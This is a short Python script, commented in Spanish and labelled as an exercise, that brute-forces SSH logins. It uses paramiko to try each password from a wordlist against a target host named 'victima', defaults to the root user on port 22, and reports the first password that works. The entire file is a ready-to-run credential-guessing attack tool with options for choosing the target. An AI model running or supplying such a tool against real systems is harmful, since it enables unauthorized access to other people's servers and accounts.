#!/usr/bin/python

#Este programa es un ejerc para fuerza bruta ssh.
#autor: daletoniris@gmail.com
#lic tipo GNU

import paramiko
import socket
from optparse import OptionParser

def fuerza_bruta(victima, usuario, puerto, diccionario):
 try:
     f=open(diccionario, "r")
     for pwd in f:
	pwd=pwd[:-1]
	ssh=paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
		ssh.connect(victima,puerto,usuario,pwd)
		print("[+] Password encontrado: %s"%pwd)
	        break;

        except paramiko.AuthenticationException:
		print("[-] Password erroneo: %s"%pwd)
		ssh.close()
        except socket.error:
		print("[-] Fallo al establecer la conexion ssh")
	        break;

     ssh.close()
 except IOError:
	 print("[-] %sdiccionario no encontrado"%diccionario)
def main():
 parser=OptionParser()
 parser.add_option("-v", "--victima", dest="victima", type="string", help="Victima para hacer la fuerza bruta", metavar="IP/URL")
 parser.add_option("-u", "--usuario", dest="usuario", type="string", help="Usuario victima", metavar="USERNAME", default="root",)
 parser.add_option("-p", "--puerto", dest="port", type="int", help="puerto ssh", metavar="Port", default=22)
 parser.add_option("-d", "--diccionario", dest="dicci", type="string", help="diccionario", metavar="El diccionario")

 options, args=parser.parse_args()

 if options.victima and options.dicci:
	fuerza_bruta(options.victima, options.usuario, options.port, options.dicci)
 else:
	parser.print_help()
if __name__=="__main__":
	main()



	
